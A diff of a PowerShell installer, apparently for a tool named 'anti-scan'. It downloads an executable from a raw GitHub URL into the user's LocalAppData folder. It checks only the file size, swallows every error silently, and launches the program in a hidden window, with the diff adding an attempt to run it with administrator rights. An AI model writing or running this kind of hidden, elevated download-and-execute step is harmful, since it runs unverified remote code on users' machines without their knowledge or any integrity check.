@@ -4,15 +4,28 @@ $REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/ANTI/main/dist"
 $installDir = "$env:LOCALAPPDATA\AntiScan"
 $exePath    = "$installDir\anti-scan.exe"
 
-Remove-Item -Path $installDir -Recurse -Force -ErrorAction SilentlyContinue
-$null = New-Item -ItemType Directory -Force -Path $installDir
+# 1. Arreter proprement tout processus existant
+try {
+    Get-Process -Name "anti-scan" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+} catch {}
+Start-Sleep -Milliseconds 500
+
+# 2. Preparer le repertoire de destination specifique
+try {
+    if (Test-Path $installDir) {
+        Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
+    } else {
+        $null = New-Item -ItemType Directory -Force -Path $installDir
+    }
+} catch {}
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $downloaded = $false
 
+# 3. Telechargement
 try {
     $wc = New-Object System.Net.WebClient
-    $wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ANTI-Scanner/3.4"
+    $wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ANTI-Scanner/3.7"
     $wc.DownloadFile("$REPO_URL/anti-scan.exe", $exePath)
     if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
 } catch {}
@@ -34,8 +47,13 @@ if (-not $downloaded) {
 
 if (-not $downloaded) { exit 1 }
 
+# 4. Lancement asynchrone avec privileges Administrateur
 try {
-    Start-Process -FilePath $exePath -WindowStyle Hidden
-} catch {}
+    Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden
+} catch {
+    try {
+        Start-Process -FilePath $exePath -WindowStyle Hidden
+    } catch {}
+}
 
 exit 0
